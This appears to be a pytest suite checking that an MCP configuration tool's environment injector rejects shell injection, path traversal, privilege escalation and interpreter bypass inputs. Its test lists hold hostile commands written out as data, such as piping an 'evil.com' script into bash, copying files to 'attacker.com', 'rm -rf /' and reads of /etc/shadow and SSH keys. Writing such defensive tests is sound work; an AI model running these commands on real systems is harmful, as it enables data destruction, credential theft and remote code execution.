"""
Comprehensive Security Validation Tests

Tests security aspects of the MCP system including environment injection,
command execution, file access, and secret handling.
"""

import pytest
import tempfile
import os
import subprocess
from pathlib import Path
from unittest.mock import patch, MagicMock
import yaml

from src.claude_config.env_injector import (
    EnvironmentInjector,
    EnvironmentVariableConfig,
    EnvironmentSourceType
)
from src.claude_config.mcp_processor import MCPProcessor


class TestEnvironmentInjectionSecurity:
    """Test security of environment variable injection system."""

    @pytest.fixture
    def security_injector(self):
        """Create environment injector for security testing."""
        return EnvironmentInjector()

    def test_shell_injection_prevention(self, security_injector):
        """Test prevention of shell injection attacks."""
        dangerous_commands = [
            "whoami; rm -rf /",
            "whoami && cat /etc/passwd",
            "whoami || touch /tmp/pwned",
            "whoami $(cat /etc/passwd)",
            "whoami `cat /etc/passwd`",
            "whoami | cat /etc/passwd",
            "whoami > /tmp/pwned",
            "whoami >> /tmp/pwned",
            "whoami 2>&1",
            "whoami; /bin/sh",
            "whoami & echo pwned",
            "$(curl evil.com/script.sh)",
            "`curl evil.com/script.sh`",
            "whoami; wget evil.com/malware -O /tmp/mal && chmod +x /tmp/mal && /tmp/mal"
        ]

        for dangerous_cmd in dangerous_commands:
            assert not security_injector._validate_command(dangerous_cmd), \
                f"Should reject dangerous command: {dangerous_cmd}"

    def test_file_path_traversal_prevention(self, security_injector):
        """Test prevention of path traversal attacks."""
        dangerous_paths = [
            "../../../etc/passwd",
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/proc/self/environ",
            "/proc/version",
            "/root/.ssh/id_rsa",
            "/home/../etc/passwd",
            "../../../../etc/passwd",
            "/tmp/../etc/passwd",
            "~/../../../etc/passwd",
            "${HOME}/../../../etc/passwd",
            "/var/log/auth.log",
            "/var/log/syslog",
            "/etc/sudoers",
            "/etc/group"
        ]

        for dangerous_path in dangerous_paths:
            assert not security_injector._validate_file_path(dangerous_path), \
                f"Should reject dangerous path: {dangerous_path}"

    def test_environment_variable_name_validation(self, security_injector):
        """Test strict validation of environment variable names."""
        # Valid names
        valid_names = [
            "API_TOKEN", "DATABASE_URL", "SECRET_KEY", "APP_ENV",
            "TEST_VAR", "CONFIG_123", "DEPLOY_ENV", "SERVICE_PORT"
        ]
        
        for name in valid_names:
            assert security_injector._validate_environment_variable_name(name), \
                f"Should accept valid name: {name}"

        # Invalid names (potential injection vectors)
        invalid_names = [
            "api_token",  # lowercase
            "123_VAR",    # starts with number
            "VAR-NAME",   # contains dash
            "VAR NAME",   # contains space
            "VAR.NAME",   # contains dot
            "VAR$NAME",   # contains dollar
            "VAR(NAME)",  # contains parentheses
            "",           # empty
            "$PATH",      # starts with dollar
            "VAR;CMD",    # contains semicolon
            "VAR|CMD",    # contains pipe
        ]

        for name in invalid_names:
            assert not security_injector._validate_environment_variable_name(name), \
                f"Should reject invalid name: {name}"

    def test_command_substitution_security(self, security_injector):
        """Test security of command substitution functionality."""
        # Safe commands that should be allowed
        safe_commands = [
            "whoami", "hostname", "date", "pwd", "id",
            "echo hello", "cat /dev/null", "ls /tmp"
        ]

        for cmd in safe_commands:
            assert security_injector._validate_command(cmd), \
                f"Should allow safe command: {cmd}"

        # Test actual command execution with mocking
        with patch('subprocess.run') as mock_run:
            mock_run.return_value.stdout = "test_output"
            mock_run.return_value.returncode = 0

            config = EnvironmentVariableConfig(
                source=EnvironmentSourceType.COMMAND,
                command="whoami",
                cache_duration=0
            )

            result = security_injector.resolve_command_variable(config)
            assert result == "test_output"
            
            # Verify subprocess.run was called with safe parameters
            mock_run.assert_called_once()
            call_args = mock_run.call_args
            assert call_args[1].get('shell') is False  # Never use shell=True
            assert call_args[1].get('capture_output') is True

    def test_file_access_security(self, security_injector):
        """Test security of file access functionality."""
        with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
            f.write("test_secret_content")
            temp_path = f.name

        try:
            # Test legitimate file access
            config = EnvironmentVariableConfig(
                source=EnvironmentSourceType.FILE,
                path=temp_path
            )

            result = security_injector.resolve_file_variable(config)
            assert result == "test_secret_content"

            # Test dangerous path rejection
            dangerous_config = EnvironmentVariableConfig(
                source=EnvironmentSourceType.FILE,
                path="/etc/passwd"
            )

            with pytest.raises(ValueError, match="dangerous"):
                security_injector.resolve_file_variable(dangerous_config)

        finally:
            Path(temp_path).unlink(missing_ok=True)

    def test_secret_masking_functionality(self, security_injector):
        """Test that secrets are properly masked in logs and outputs."""
        secrets = ["super_secret_token", "password123", "api_key_xyz"]
        
        # Test basic masking
        for secret in secrets:
            masked = security_injector.mask_secrets([secret], secret)
            assert secret not in masked
            assert "***" in masked

        # Test masking in complex structures
        complex_data = {
            "config": {
                "api_token": "super_secret_token",
                "database_url": "postgresql://user:password123@host/db",
                "debug": True
            },
            "nested": {
                "key": "api_key_xyz",
                "normal": "normal_value"
            }
        }

        masked_data = security_injector.mask_secrets(secrets, str(complex_data))
        
        for secret in secrets:
            assert secret not in masked_data
        assert "***" in masked_data
        assert "normal_value" in masked_data  # Non-secrets preserved

    def test_cache_security(self, security_injector):
        """Test security aspects of command result caching."""
        # Test that cache keys don't contain sensitive information
        config = EnvironmentVariableConfig(
            source=EnvironmentSourceType.COMMAND,
            command="echo sensitive_info",
            cache_duration=3600
        )

        with patch('subprocess.run') as mock_run:
            mock_run.return_value.stdout = "sensitive_output"
            mock_run.return_value.returncode = 0

            # First call should execute command
            result1 = security_injector.resolve_command_variable(config)
            assert result1 == "sensitive_output"

            # Second call should use cache
            result2 = security_injector.resolve_command_variable(config)
            assert result2 == "sensitive_output"
            
            # Verify command only executed once
            assert mock_run.call_count == 1

        # Verify cache key doesn't contain sensitive command
        cache_key = security_injector.command_cache._generate_cache_key(config.command)
        # Cache key should be hashed, not contain original command
        assert "sensitive_info" not in cache_key
        assert len(cache_key) > 10  # Should be a hash

    def test_privilege_escalation_prevention(self, security_injector):
        """Test prevention of privilege escalation attempts."""
        escalation_attempts = [
            "sudo whoami",
            "su root",
            "sudo -u root cat /etc/shadow",
            "chmod +s /bin/bash",
            "setuid(0)",
            "/usr/bin/sudo whoami",
            "pkexec whoami",
            "runuser -l root",
            "doas whoami"
        ]

        for attempt in escalation_attempts:
            assert not security_injector._validate_command(attempt), \
                f"Should block privilege escalation: {attempt}"

    def test_network_access_validation(self):
        """Test validation of network access in MCP configurations."""
        dangerous_network_commands = [
            "curl http://evil.com/script.sh | bash",
            "wget malware.com/virus -O /tmp/virus",
            "nc -l -p 1337",
            "telnet attacker.com 4444",
            "ssh user@remote 'rm -rf /'",
            "ftp evil.com",
            "scp secret.txt attacker.com:",
            "rsync -av / attacker.com:/data/"
        ]

        injector = EnvironmentInjector()
        for cmd in dangerous_network_commands:
            assert not injector._validate_command(cmd), \
                f"Should block dangerous network command: {cmd}"


class TestMCPSecurityValidation:
    """Test security validation in MCP server configurations."""

    def test_trust_level_enforcement(self):
        """Test that trust levels are properly enforced."""
        with tempfile.TemporaryDirectory() as temp_dir:
            data_dir = Path(temp_dir)
            mcp_dir = data_dir / "mcp_servers"
            mcp_dir.mkdir()

            # Create server with untrusted trust level
            untrusted_config = {
                "name": "untrusted-server",
                "display_name": "Untrusted Server",
                "description": "Server with untrusted security level",
                "category": "development",
                "server": {"command": "node", "args": ["server.js"]},
                "environment": {
                    "variables": {
                        "EXTERNAL_API": {
                            "source": "command",
                            "command": "curl api.example.com/token",  # Network access
                            "required": True
                        }
                    }
                },
                "security": {
                    "trust_level": "untrusted",
                    "network_access": False,  # Contradicts command usage
                    "permissions": [],
                    "data_access": []
                },
                "development": {"status": "experimental"}
            }

            with open(mcp_dir / "untrusted-server.yaml", 'w') as f:
                yaml.dump(untrusted_config, f)

            processor = MCPProcessor(data_dir)
            
            # Should detect security policy violation
            result = processor.validate_mcp_server("untrusted-server")
            assert not result.is_valid
            # Should have errors about network access or dangerous commands

    def test_experimental_server_restrictions(self):
        """Test additional restrictions on experimental servers."""
        with tempfile.TemporaryDirectory() as temp_dir:
            data_dir = Path(temp_dir)
            mcp_dir = data_dir / "mcp_servers"
            mcp_dir.mkdir()

            experimental_config = {
                "name": "experimental-server",
                "display_name": "Experimental Server",
                "description": "Experimental server with restrictions",
                "category": "development",
                "server": {"command": "experimental", "args": []},
                "environment": {
                    "variables": {
                        "SYSTEM_INFO": {
                            "source": "command",
                            "command": "uname -a",
                            "required": True
                        }
                    }
                },
                "security": {
                    "trust_level": "experimental",
                    "network_access": True,
                    "permissions": ["system.read"],
                    "data_access": ["system-logs"]
                },
                "development": {"status": "experimental"}
            }

            with open(mcp_dir / "experimental-server.yaml", 'w') as f:
                yaml.dump(experimental_config, f)

            processor = MCPProcessor(data_dir)
            result = processor.validate_mcp_server("experimental-server")
            
            # May pass validation but should have warnings
            # Implementation depends on actual security policy

    def test_secret_leakage_prevention(self):
        """Test prevention of secret leakage in various contexts."""
        with tempfile.TemporaryDirectory() as temp_dir:
            data_dir = Path(temp_dir)
            mcp_dir = data_dir / "mcp_servers"
            mcp_dir.mkdir()

            config = {
                "name": "secret-test-server",
                "display_name": "Secret Test Server",
                "description": "Server for testing secret handling",
                "category": "development",
                "server": {"command": "test", "args": []},
                "environment": {
                    "variables": {
                        "SECRET_TOKEN": {
                            "source": "env",
                            "variable": "SUPER_SECRET_API_TOKEN",
                            "required": True
                        }
                    },
                    "secrets": ["SECRET_TOKEN"],
                    "validation": {"required": ["SECRET_TOKEN"]}
                },
                "security": {"trust_level": "trusted", "network_access": False},
                "development": {"status": "stable"}
            }

            with open(mcp_dir / "secret-test-server.yaml", 'w') as f:
                yaml.dump(config, f)

            secret_value = "super_secret_api_token_12345"
            with patch.dict(os.environ, {"SUPER_SECRET_API_TOKEN": secret_value}):
                processor = MCPProcessor(data_dir)
                server_def = processor.load_mcp_server("secret-test-server")
                
                # Process for Claude Code
                claude_config = processor.process_for_claude_code(server_def)
                
                # Secret should be in the actual config
                assert claude_config["env"]["SECRET_TOKEN"] == secret_value
                
                # But should be masked in string representations
                config_str = str(claude_config)
                # Either the secret is not in the string, or it's masked
                assert secret_value not in config_str or "***" in config_str

    def test_environment_validation_bypasses(self):
        """Test for potential bypasses in environment validation."""
        injector = EnvironmentInjector()
        
        # Test various encoding attempts
        bypass_attempts = [
            "$(echo 'whoami')",
            "`echo 'whoami'`", 
            "eval whoami",
            "exec whoami",
            "/bin/bash -c whoami",
            "/bin/sh -c 'whoami'",
            "python -c 'import os; os.system(\"whoami\")'",
            "node -e 'require(\"child_process\").exec(\"whoami\")'",
            "perl -e 'system(\"whoami\")'",
            "ruby -e 'system(\"whoami\")'",
            "php -r 'system(\"whoami\");'",
            "powershell -c whoami",
            "cmd /c whoami"
        ]

        for attempt in bypass_attempts:
            assert not injector._validate_command(attempt), \
                f"Should block bypass attempt: {attempt}"

    def test_file_descriptor_attacks(self, security_injector):
        """Test prevention of file descriptor based attacks."""
        fd_attacks = [
            "/proc/self/fd/0",
            "/proc/self/fd/1", 
            "/proc/self/fd/2",
            "/dev/stdin",
            "/dev/stdout", 
            "/dev/stderr",
            "/proc/self/mem",
            "/proc/self/maps",
            "/proc/self/status"
        ]

        for attack_path in fd_attacks:
            assert not security_injector._validate_file_path(attack_path), \
                f"Should block file descriptor attack: {attack_path}"

    def test_symlink_attack_prevention(self):
        """Test prevention of symlink-based attacks."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            
            # Create a symlink to /etc/passwd
            legitimate_file = temp_path / "legitimate.txt"
            legitimate_file.write_text("safe content")
            
            symlink_file = temp_path / "symlink.txt"
            symlink_file.symlink_to("/etc/passwd")

            injector = EnvironmentInjector()
            
            # Should allow legitimate file
            config_legit = EnvironmentVariableConfig(
                source=EnvironmentSourceType.FILE,
                path=str(legitimate_file)
            )
            
            result = injector.resolve_file_variable(config_legit)
            assert result == "safe content"
            
            # Should block symlink to dangerous file
            config_symlink = EnvironmentVariableConfig(
                source=EnvironmentSourceType.FILE,
                path=str(symlink_file)
            )
            
            # Should either reject the path or resolve to safe content
            # Implementation may vary based on symlink handling policy


class TestSecurityAuditing:
    """Test security auditing and logging capabilities."""

    def test_security_event_logging(self):
        """Test that security events are properly logged."""
        import logging
        from unittest.mock import Mock

        # Mock logger to capture security events
        mock_logger = Mock()
        
        with patch('src.claude_config.env_injector.logger', mock_logger):
            injector = EnvironmentInjector()
            
            # Attempt dangerous operation
            try:
                injector._validate_command("rm -rf /")
            except Exception:
                pass
            
            # Should have logged security event
            # (Actual implementation depends on logging setup)

    def test_security_metrics_collection(self):
        """Test collection of security-related metrics."""
        injector = EnvironmentInjector()
        
        # Simulate various operations
        operations = [
            ("safe_command", "whoami"),
            ("dangerous_command", "rm -rf /"),
            ("safe_file", "/tmp/safe.txt"),
            ("dangerous_file", "/etc/passwd"),
            ("safe_env", "API_TOKEN"),
            ("dangerous_env", "dangerous$var")
        ]

        results = {}
        for op_type, value in operations:
            if op_type.endswith("_command"):
                results[op_type] = injector._validate_command(value)
            elif op_type.endswith("_file"):
                results[op_type] = injector._validate_file_path(value)
            elif op_type.endswith("_env"):
                results[op_type] = injector._validate_environment_variable_name(value)

        # Verify security boundaries
        assert results["safe_command"] is True
        assert results["dangerous_command"] is False
        assert results["safe_file"] is True
        assert results["dangerous_file"] is False
        assert results["safe_env"] is True
        assert results["dangerous_env"] is False


@pytest.mark.slow
class TestSecurityStressTests:
    """Stress tests for security under high load."""

    def test_concurrent_security_validation(self):
        """Test security validation under concurrent access."""
        import threading
        import concurrent.futures
        
        injector = EnvironmentInjector()
        
        def validate_batch(batch_num):
            results = []
            for i in range(100):
                # Mix of safe and dangerous operations
                if i % 2 == 0:
                    result = injector._validate_command("whoami")
                    results.append(("safe", result))
                else:
                    result = injector._validate_command(f"rm -rf / && echo {batch_num}")
                    results.append(("dangerous", result))
            return results

        # Run concurrent validation
        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
            futures = [executor.submit(validate_batch, i) for i in range(10)]
            all_results = [future.result() for future in futures]

        # Verify all results are correct regardless of concurrency
        for batch_results in all_results:
            for op_type, result in batch_results:
                if op_type == "safe":
                    assert result is True
                else:
                    assert result is False

    def test_memory_usage_under_attack(self):
        """Test memory usage when processing many attack attempts."""
        import psutil
        import os
        
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss
        
        injector = EnvironmentInjector()
        
        # Generate many attack attempts
        for i in range(1000):
            attack_cmd = f"curl evil{i}.com/script.sh | bash && rm -rf /{i}"
            result = injector._validate_command(attack_cmd)
            assert result is False
        
        final_memory = process.memory_info().rss
        memory_increase = final_memory - initial_memory
        
        # Memory increase should be reasonable (less than 50MB)
        assert memory_increase < 50 * 1024 * 1024, \
            f"Memory increased by {memory_increase / 1024 / 1024:.2f}MB"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])